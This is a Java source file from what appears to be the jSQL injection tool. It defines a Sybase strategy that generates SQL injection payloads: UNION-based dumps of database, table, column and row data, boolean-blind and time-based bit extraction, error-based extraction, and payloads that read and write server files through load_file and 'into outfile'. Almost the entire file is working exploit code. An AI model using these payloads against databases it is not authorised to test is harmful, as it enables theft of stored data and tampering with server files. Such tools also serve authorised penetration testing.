package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class SybaseStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "select+" +
                "@@version%2B'{%}'%2Bdb_name()%2B'{%}'%2Buser_name()%2B'{%}'%2Bsuser_name()" +
            "%2B'%01%03%03%07'r";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
            "from(select+distinct++name+from+master..sysdatabases)t,(select+distinct+name+from+master..sysdatabases)t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getTableList(Database database) {
        return 
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
            "from(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t,(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getColumnList(Table table) {
        return 
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
            "from(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t,(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        formatListColumn = formatListColumn.replace("{%}", "%2b'')))%2b'%7f'%2brtrim(ltrim(convert(varchar,");
        
        formatListColumn = "rtrim(ltrim(convert(varchar," + formatListColumn + "%2b'')))";

        return 
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.s%2b'%050%04'rr+" +
            "from(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+t.s{limit})a";
    }

    @Override
    public String getPrivilege() {
        return "";
    }

    @Override
    public String readTextFile(String filePath) {
        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        return 
            MediatorModel.model().initialQuery
                .replaceAll(
                    "1337" + MediatorModel.model().visibleIndex + "7331",
                    "(select+0x" + ToolsString.strhex(content) + ")"
                )
                .replaceAll("--++", "")
                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
                "select+" +
                "concat(" +
                    "0x53514c69," +
                    "mid(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        "65536" +
                    ")" +
                ")" +
            ")";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        return 
            "+and(" +
                "select+1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "floor(rand(0)*2)" +
                    "from+" +
                        "information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return 
            "+and" +
                "(" +
                "select+" +
                    "1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "concat(" +
                            "0x53514c69," +
                            "mid(" +
                                "(" + sqlQuery + ")," +
                                startPosition + "," +
                                "64" +
                            ")," +
                        "floor(rand(0)*2)" +
                    ")" +
                    "from+information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "select'SQLi'%2bsubstring(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")" +
            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select'SQLi$1'%2breplicate('%23',1024)%2b'iLQS')"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select+convert(varchar,(1337"+ i +"7330%2b1))a";
        }
        return "+union+select" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return 
            "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
    
    @Override
    public String getDbLabel() {
        return "Sybase";
    }
}